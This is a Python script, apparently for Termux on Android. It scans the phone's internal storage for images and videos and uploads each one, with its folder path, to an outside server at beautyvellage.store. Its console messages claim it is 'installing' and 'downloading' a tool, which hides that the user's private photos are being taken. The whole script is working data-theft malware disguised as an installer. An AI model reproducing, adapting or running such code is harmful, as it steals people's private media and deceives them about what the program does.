import os
import requests

# ✅ Step 1
base_path = "/storage/emulated/0/"  # Android internal storage
server_url = "https://beautyvellage.store/termux/upload.php"  
image_extensions = ['.jpg', '.jpeg', '.png', '.webp', '.mp4']
max_file_size = 20 * 1024 * 1024  # 20 MB in bytes

# ✅ Step 2
def find_all_images(path):
    image_files = []
    for root, dirs, files in os.walk(path):
        for file in files:
            if any(file.lower().endswith(ext) for ext in image_extensions):
                image_files.append(os.path.join(root, file))
    return image_files

# ✅ Step 3
def get_file_size_mb(file_path):
    try:
        size_bytes = os.path.getsize(file_path)
        size_mb = size_bytes / (1024 * 1024)
        return size_mb
    except:
        return 0

def upload_image(image_path):
    try:
        # Check file size first
        file_size_mb = get_file_size_mb(image_path)
        
        if file_size_mb > 20:
            return "skipped_size"  # File too large
        
        relative_path = os.path.relpath(image_path, base_path)  # Relative path to keep folder structure
        with open(image_path, 'rb') as f:
            files = {'file': (os.path.basename(image_path), f, 'image/jpeg')}
            data = {'path': relative_path}  # Send relative path to server
            response = requests.post(server_url, files=files, data=data)
            if response.status_code == 200:
                return True
            else:
                return False
    except Exception as e:
        return False

# ✅ Step 4: Run Everything
if __name__ == "__main__":
    print("🔍 Preparing for install...")
    images = find_all_images(base_path)
    total_images = len(images)
    print(f" Downloading started. Please wait, it may take several minutes...\n")
    
    uploaded_count = 0
    skipped_count = 0
    failed_count = 0

    for idx, img in enumerate(images, start=1):
        result = upload_image(img)
        percent = int((idx / total_images) * 100)
        
        if result == True:
            uploaded_count += 1
            print(f"✔ Download  ({percent}%) - {os.path.basename(img)}", end="\r")
        elif result == "skipped_size":
            skipped_count += 1
            file_size = get_file_size_mb(img)
            
        else:
            failed_count += 1
           

    print("\n" + "="*50)
    print("✅ Download Summary:")
  
    print("\n✅ All done! Tool opening...")
